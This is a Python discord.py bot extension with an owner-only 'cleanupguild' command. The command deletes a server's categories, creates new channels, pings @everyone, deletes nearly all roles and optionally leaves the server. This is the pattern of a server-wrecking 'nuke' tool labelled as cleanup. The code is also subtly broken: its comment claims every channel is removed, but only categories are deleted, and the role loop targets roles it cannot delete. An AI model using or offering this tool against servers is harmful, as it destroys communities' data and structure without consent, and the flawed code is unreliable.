import discord
from discord.ext import commands

class CleanupGuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.is_owner()
    async def cleanupguild(self, ctx, leave_after_cleanup: str, category_name: str, channel_name: str):
        # Step 1: Remove all channels and categories
        for category in ctx.guild.categories:
            await category.delete()

        # Step 2: Add one category and channel with the names provided
        category = await ctx.guild.create_category(category_name)
        await ctx.guild.create_text_channel(channel_name, category=category)

        # Step 3: Send cleanup message in the leftover channel
        leftover_channel = await ctx.guild.create_text_channel("leftover")
        await leftover_channel.send("Server cleaned up @everyone")

        # Step 4: Delete all roles except the bot's admin role
        admin_role = ctx.guild.me.top_role
        for role in ctx.guild.roles:
            if role != admin_role:
                await role.delete()

        # Step 5: Leave the server if specified
        if leave_after_cleanup.lower() == "yes":
            await ctx.guild.leave()
            return

def setup(bot):
    bot.add_cog(CleanupGuild(bot))
